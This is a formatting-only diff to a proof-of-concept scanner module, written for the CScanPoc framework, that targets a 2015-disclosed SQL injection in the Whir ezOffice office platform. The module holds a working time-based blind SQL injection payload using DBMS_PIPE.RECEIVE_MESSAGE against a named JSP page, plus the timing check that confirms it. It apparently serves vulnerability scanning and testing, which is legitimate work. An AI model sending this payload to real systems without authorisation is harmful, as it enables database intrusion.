@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Whir_0012' # 平台漏洞编号，留空
+    vuln_id = 'Whir_0012'  # 平台漏洞编号，留空
     name = '万户ezOffice协同办公管理平台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-01-12'  # 漏洞公布时间
     desc = '''
        万户ezOffice协同办公管理平台 /defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp页面未做过滤，导致SQL注入。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '万户OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a7cf5999-ddd5-4b9f-86bd-fa65dac026d4'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            hh =hackhttp.hackhttp()
+
+            hh = hackhttp.hackhttp()
             payload_normal = "/defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp?numId=1"
             payload_bug = "/defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp?numId=1%20AND%203902=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(75)||CHR(106)||CHR(82),7)"
             start_normal = time.time()
@@ -47,7 +49,7 @@ class Poc(ABPoc):
             end_bug = time.time()
             times_bug = end_bug - start_bug
 
-            if code1 == 200 and code2==200 and times_bug-times_normal > 6:
+            if code1 == 200 and code2 == 200 and times_bug-times_normal > 6:
                 #security_hole('This ezOFFICE has Vulnerability!')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -57,6 +59,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
